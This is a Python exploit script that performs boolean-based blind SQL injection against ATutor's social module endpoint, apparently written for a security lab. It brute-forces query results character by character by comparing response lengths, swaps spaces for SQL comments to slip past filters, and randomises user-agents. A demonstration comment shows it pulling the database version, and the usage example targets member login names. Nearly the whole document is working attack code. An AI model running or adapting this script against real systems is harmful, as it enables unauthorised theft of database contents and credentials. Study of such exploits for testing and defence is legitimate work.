# DEMONSTRATION
# $ python3 sqli_mysql_bool_response-length.py "select @@version" 20 "1')" "%23" http://192.168.252.13/ATutor/mods/_standard/social/index_public.php
# Retrieving query using: select @@version
# 5.5.47-0+deb8u1
# 
# [+] Result: 5.5.47-0+deb8u1
# 
# [+] Done!

#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 5

# Printable ASCII chars
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[!] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def random_agent():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def do_req(url,headers,content_len,ascii_char,inj_str):
    comment_inj_str = re.sub(" ","/**/",inj_str)
    params = {'q':comment_inj_str.replace("[CHAR]", str(ascii_char))}
    params_str = "&".join("%s=%s" % (k,v) for k,v in params.items())
    r = requests.get(url,params=params_str,headers=headers,timeout=timeout,verify=False)
    resp_content_len = len(r.content)
    if (resp_content_len > content_len):
        return True

def sqli(url,headers,content_len,inj_str):
    for j in range(ascii_begin,ascii_end):
        response = do_req(url,headers,content_len,j,inj_str)
        if response:
            return j

def inject(str_len,str_regex_query,url,headers,content_len,prefix,suffix):
    extracted = ""
    or_substr = prefix + " or (ascii(substring(("
    
    for i in range(1,str_len):
        # Check of current pos still contains a valid ASCII char using >
        check_pos = or_substr + str_regex_query + ")," + str(i) + ",1)))>[CHAR]" + suffix
        retr_pos = do_req(url,headers,content_len,ascii_begin,check_pos)
        if not retr_pos:
            break

        # Continue guessing the character by comparing using =
        inj_str = or_substr + str_regex_query + ")," + str(i) + ",1)))=[CHAR]" + suffix
        retr_value = sqli(url,headers,content_len,inj_str)
        if retr_value:
            extracted += chr(retr_value)
            extracted_char = chr(retr_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
    
    print("\n")
    return extracted

# Main
def main(argv):
    if len(sys.argv) == 6:
        query = sys.argv[1]
        content_len = int(sys.argv[2])
        prefix = sys.argv[3]
        suffix = sys.argv[4]
        url = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <query> <content_len> <prefix> <suffix> <url>")
        print("[*] Example: " + sys.argv[0] + " \"select login from AT_members\" 20 \"1')\" \"%23\" http://192.168.252.14/ATutor/mods/_standard/social/index_public.php\n")
        exit(0)

    # Variables
    str_length = 50
    headers = random_agent()

    # Do stuff
    try:
        # Print string
        print("Retrieving query using: " + query)
        output = inject(str_length,query,url,headers,content_len,prefix,suffix)
        print("[+] Result: " + output)
        print("\n[+] Done!")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

